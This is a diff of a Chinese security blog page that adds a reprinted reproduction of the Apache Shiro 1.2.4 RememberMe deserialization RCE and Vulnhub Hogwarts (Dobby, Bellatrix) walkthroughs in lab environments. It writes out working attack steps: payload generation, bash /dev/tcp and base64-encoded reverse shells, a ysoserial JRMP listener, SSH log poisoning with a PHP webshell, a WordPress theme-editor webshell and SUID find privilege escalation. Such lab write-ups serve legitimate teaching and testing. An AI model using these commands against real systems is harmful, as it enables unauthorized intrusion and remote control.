@@ -82,8 +82,8 @@
 
     
         <h2 class="title">
-            <a href="/2022/08/08/Hogwarts-Bellatrix/">
-                Hogwarts Bellatrix
+            <a href="/2022/08/08/Shiro-RememberMe-1-2-4/">
+                Shiro RememberMe 1.2.4
             </a>
         </h2>
     
@@ -91,73 +91,191 @@
         Aug 8, 2022
     </time>
     <section class="content">
-        <h1><span id="hogwarts-bellatrix">HOGWARTS: BELLATRIX</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hogwarts-bellatrix">名称：Hogwarts: Bellatrix</span></h4><h4><span id="发布日期20201128">发布日期：2020.11.28</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
+        <h1><span id="shiro-rememberme-124-反序列化命令执行漏洞复现-kali-docker">Shiro RememberMe 1.2.4 反序列化命令执行漏洞复现 kali docker</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44067239/article/details/106918315">莫憨憨</a></p>
+</blockquote>
+<h3><span id="影响版本apache-shiro-ltx3d-124">影响版本：Apache Shiro &lt;&#x3D; 1.2.4</span></h3><h2><span id="漏洞产生原因">漏洞产生原因:</span></h2><blockquote>
+<p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。使用大佬脚本生成 payload(ysoserial.jar文件和运行目录处于同一目录)</p>
+</blockquote>
+<h2><span id="漏洞环境搭建">漏洞环境搭建</span></h2><h3><span id="1拉取镜像">1.拉取镜像</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+
+<h3><span id="2启动环境">2.启动环境</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 -p 7777:6666 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如需进入环境，命令为</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it name /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3><span id="3web访问">3.web访问</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a> 能看到如下页面即可</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/1.png" alt="image"></p>
+<p>或虚拟机外面用真实ip访问</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/2.png" alt="image"></p>
+<p>至此漏洞环境搭建成功</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><h3><span id="1抓包测试">1.抓包测试</span></h3><blockquote>
+<p>查看返回包里setcookie有rememberme的字样</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/3.png" alt="image"></p>
+</blockquote>
+<h3><span id="2继续测试">2.继续测试</span></h3><blockquote>
+<p>首先最简单的测试方法是用dnslog，看看是否有回显。<br>利用POC生成想要执行的命令对应的rememberMe</p>
+</blockquote>
+<h3><span id="3工具准备">3.工具准备</span></h3><blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/4.png" alt="image"></p>
+<p>生成payload的脚本使用的是python3,运行报错就安装一下模块</p>
+</blockquote>
+<h3><span id="4生成payload">4.生成payload：</span></h3><blockquote>
+<p>双引号中是想要执行的命令，如果这里没有公网VPS，就用dnslog来证明。攻击原理一样，不认可的杠精可直接怼</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;ping 39p2wo.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>运行结果如下图：</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/5.png" alt="image"></p>
+<p>然后便会在脚本所在目录下生成文件payload.cookie</p>
+</blockquote>
+<h3><span id="5回到浏览器抓包">5.回到浏览器抓包</span></h3><blockquote>
+<p>用payload.cookie中的rememberMe内容加入Cookie中，或者直接放进参数中，提交看页面回显和dnslog页面是否有数据过去</p>
+</blockquote>
+<h3><span id="6到ceye平台查看日志记录">6.到ceye平台查看日志记录</span></h3><blockquote>
+<p>dnslog日志刷新后有记录了，说明payloda执行成功</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="反弹shell">反弹shell</span></h2><blockquote>
+<p>当然了，有VPS的情况下，为何不反弹一下shell呢？</p>
+</blockquote>
+<h3><span id="1使用脚本生成key">1.使用脚本生成key</span></h3><blockquote>
+<p>反弹shell的命令：<code>bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>PS：ip假的，不打码，观看流畅</p>
+</blockquote>
+<h3><span id="2先公网vps监听反弹shell的命令">2.先公网VPS监听反弹shell的命令</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7878</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/7.png" alt="image"></p>
+</blockquote>
+<h3><span id="3加入payload提交数据包">3.加入payload，提交数据包</span></h3><blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/8.png" alt="image"></p>
+<p>这里使用curl也能达到burp的效果</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加 -I 是只看响应头，这里主要关注set-cookie:rememberMe</span><br><span class="line">curl -X GET http://172.16.12.132 --cookie “xxxxxxxxxxxxx” -I</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>讲这个是因为此方法可以用来初步探测shiro信息</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="4vps收到了反弹回来的shell">4.vps收到了反弹回来的shell</span></h3><blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/10.png" alt="image"></p>
+</blockquote>
+<h2><span id="题外话1">题外话1</span></h2><blockquote>
+<p>研究这个漏洞，是因为客户要求排查下资产，然后找不到集成的工具和一键式检查的。<br>漏洞的事情OK了，还是觉得自己太菜，要是代码够给力，写个集成的丢github上就真的香。</p>
+</blockquote>
+<h2><span id="题外话2">题外话2</span></h2><blockquote>
+<p>还有一个思路，看大佬文章时，这里一直没搞懂。字面意思是用ysoserial中的JRMP监听模块来搞定的，后续学会了再补上笔记</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections5 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/11.png" alt="image"></p>
+</blockquote>
+<h2><span id="参考链接">参考链接：</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0007eafd1f92">https://www.jianshu.com/p/0007eafd1f92</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/112742.html">https://www.secpulse.com/archives/112742.html</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/08/Hogwarts-Dobby/">
+                Hogwarts Dobby
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="hogwarts-dobby">HOGWARTS: DOBBY</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称hogwarts-dobby">名称：Hogwarts: Dobby</span></h4><h4><span id="发布日期2020118">发布日期：2020.11.8</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
 <h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;proof.txt </p>
 <h4><span id="难度简单">难度：简单</span></h4></blockquote>
 <h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名bellatrixova">文件名：Bellatrix.ova</span></h4><h4><span id="文件大小41gb">文件大小：4.1GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsbellatrixova">下载地址：</span></h4><h4><span id="md5-e6d98d406cdf7641e4a966f16afaf536">MD5: E6D98D406CDF7641E4A966F16AFAF536</span></h4><h4><span id="sha1-8389861c7f2b1626190844e31a2a1a4ade385e06">SHA1: 8389861C7F2B1626190844E31A2A1A4ADE385E06</span></h4></blockquote>
+<h4><span id="文件名dobbyova">文件名：dobby.ova</span></h4><h4><span id="文件大小37gb">文件大小：3.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsdobbyova">下载地址：</span></h4><h4><span id="md5-11b9fd40b70344a71b432a608ee640ab">MD5: 11B9FD40B70344A71B432A608EE640AB</span></h4><h4><span id="sha1-68110b92fd58d6a4c8f0cdbe169e29259ac797a6">SHA1: 68110B92FD58D6A4C8F0CDBE169E29259AC797A6</span></h4></blockquote>
 <h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
 <h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
 <h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
 <h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
 <h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Bellatrix和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/1.png" alt="image-"></p>
+<p>1.将靶机dobby和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/1.png" alt="image-"></p>
 </blockquote>
 <h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
 <p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/2.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/2.png" alt="image-"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，发现提示存在文件包含：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.127 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/4.png" alt="image-"></p>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，没有太多值得关注的信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.127 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/6.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了80端口，访问主页，还是apache的默认页，但源码有路径提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.126 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/4.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，&#x2F;log目录值得关注一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.126 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/6.png" alt="image-"></p>
 </blockquote>
-<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
-<p>1.在主页其实是提示了有ikilledsiriusblack.php这个文件，后面跟file参数存在文件包含漏洞：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/7.png" alt="image-"></p>
-<p>2.利用文件包含漏洞，写入payload，获得shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log，可以查看SSH日志信息</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&#x27;@192.168.56.127，稍微污染SSH日志信息</span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=id，可以使用cmd命令</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/9.png" alt="image-"></p>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/10.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=php+-r+&#x27;$sock%3dfsockopen(&quot;192.168.56.102&quot;,1234)%3bexec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;)%3b&#x27;，写入命令反弹shell</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/11.png" alt="image-"></p>
+<h3><span id="网页发现">网页发现</span></h3><blockquote>
+<p>1.访问&#x2F;alohomora目录，发现Draco用户的密码提示：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/7.png" alt="image-"></p>
+<p>2.访问&#x2F;log目录，发现直接提示了一个密码和路径：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/8.png" alt="image-"></p>
+<p>3.继续访问&#x2F;DiagonAlley，发现一串brainfuck编码，且这个页面是用wordpress搭建的：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/9.png" alt="image-"></p>
+<p>4.将brainfuck字串解码，但解出来是乱码：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/10.png" alt="image-"></p>
 </blockquote>
-<h3><span id="密码爆破初步提权">密码爆破，初步提权</span></h3><blockquote>
-<p>1.我们可以在当前目录下发现一个被类似base编码了的目录，目录下有一个隐藏的字典文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd c2VjcmV0cw==</span><br><span class="line">ls -la</span><br><span class="line">cat .secret.dic</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/12.png" alt="image-"></p>
-<p>2.而Swordofgryffindor内是lestrange用户与其密码hash：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat Swordofgryffindor</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/13.png" alt="image-"></p>
-<p>3.将密码字典复制与密码hash到kali本地，利用john进行爆破：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim dic.txt</span><br><span class="line">vim hash.txt</span><br><span class="line">john --wordlist=dic.txt hash.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/14.png" alt="image-"></p>
-<p>4.可以登录到lestrange用户：</p>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/15.png" alt="image-"></p>
+<h3><span id="wordpress后台登录写入shell">Wordpress后台登录，写入shell</span></h3><blockquote>
+<p>1.再从wordpress入手，用wpscan进行扫描，但没有过多问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.126/DiagonAlley --detection-mode aggressive</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/11.png" alt="image-"></p>
+<p>2.进入wp-login.php后台页，我们有用户draco，而提示他的马的名字slytherin就是密码：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/12.png" alt="image-"></p>
+<p>3.进入wordpress后台后，对kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php进行ip及端口修改，在Apariencia-Editor de temas-Error 404页写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/13.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/14.png" alt="image-"></p>
+<p>4.在kali开启对应端口监听，访问&#x2F;DiagonAlley目录下不存在页即可触发shell，再利用python构建交互式shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/15.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/16.png" alt="image-"></p>
 </blockquote>
 <h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.利用sudo -l命令，查找可用文件，发现vim可以提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/16.png" alt="image-"></p>
-<p>2.直接写入，提权到root：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/vim -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/17.png" alt="image-"></p>
+<p>1.查找有suid的文件，发现find：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null | grep usr/bin</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/17.png" alt="image-"></p>
+<p>2.利用find可以直接提权到root：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/18.png" alt="image-"></p>
 </blockquote>
 <h3><span id="flag获取">Flag获取</span></h3><blockquote>
 <p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/18.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">vi proof.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/19.png" alt="image-"></p>
 </blockquote>
 
 
@@ -305,7 +423,7 @@ $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](25.png)</span><br></pre></td></tr></table></figure>
 <p>cd &#x2F;home&#x2F;hermoine&#x2F;bin<br>.&#x2F;su_cp -p &#x2F;home&#x2F;snape&#x2F;authorized_keys &#x2F;home&#x2F;hermoine&#x2F;.ssh&#x2F;</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](26.png)</span><br></pre></td></tr></table></figure>
-<p>Kali:<br>ssh <a href="mailto:&#104;&#101;&#x72;&#109;&#x6f;&#105;&#x6e;&#x65;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#53;&#54;&#x2e;&#x31;&#48;&#x35;">&#104;&#101;&#x72;&#109;&#x6f;&#105;&#x6e;&#x65;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#53;&#54;&#x2e;&#x31;&#48;&#x35;</a> -i .ssh&#x2F;id_rsa</p>
+<p>Kali:<br>ssh <a href="mailto:&#104;&#101;&#114;&#109;&#111;&#105;&#110;&#x65;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#53;&#54;&#x2e;&#49;&#48;&#x35;">&#104;&#101;&#114;&#109;&#111;&#105;&#110;&#x65;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#53;&#54;&#x2e;&#49;&#48;&#x35;</a> -i .ssh&#x2F;id_rsa</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">5.这个时候我们就可以去/root目录下查看horcrux2.txt这个文件，同样是用base64解密： </span><br><span class="line">![image-](27.png)</span><br><span class="line"></span><br><span class="line">### root提权</span><br><span class="line">1.我们可以在.mozilla/firefox/g2mhbq0o.default/目录下发现浏览器的登录信息，则考虑使用读取浏览器用户名和密码的工具firepwd，在hermoine开启一个http服务，传输要解密的文件给kali，可以爆出root的密码：</span><br></pre></td></tr></table></figure>
 <p>hermoine:<br>cd .mozilla&#x2F;firefox&#x2F;g2mhbq0o.default&#x2F;<br>ls -al</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](28.png)</span><br></pre></td></tr></table></figure>
@@ -316,6 +434,100 @@ $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
 <p><img src="/2022/08/08/Harrypotter-Na/29.png" alt="image-"></p>
 <p>2.进行root登录，在&#x2F;home目录下能找到最后一个flag，即horcrux3.txt：<br><img src="/2022/08/08/Harrypotter-Na/30.png" alt="image-"></p>
 <p><img src="/2022/08/08/Harrypotter-Na/31.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/08/Hogwarts-Bellatrix/">
+                Hogwarts Bellatrix
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="hogwarts-bellatrix">HOGWARTS: BELLATRIX</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称hogwarts-bellatrix">名称：Hogwarts: Bellatrix</span></h4><h4><span id="发布日期20201128">发布日期：2020.11.28</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名bellatrixova">文件名：Bellatrix.ova</span></h4><h4><span id="文件大小41gb">文件大小：4.1GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsbellatrixova">下载地址：</span></h4><h4><span id="md5-e6d98d406cdf7641e4a966f16afaf536">MD5: E6D98D406CDF7641E4A966F16AFAF536</span></h4><h4><span id="sha1-8389861c7f2b1626190844e31a2a1a4ade385e06">SHA1: 8389861C7F2B1626190844E31A2A1A4ADE385E06</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Bellatrix和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
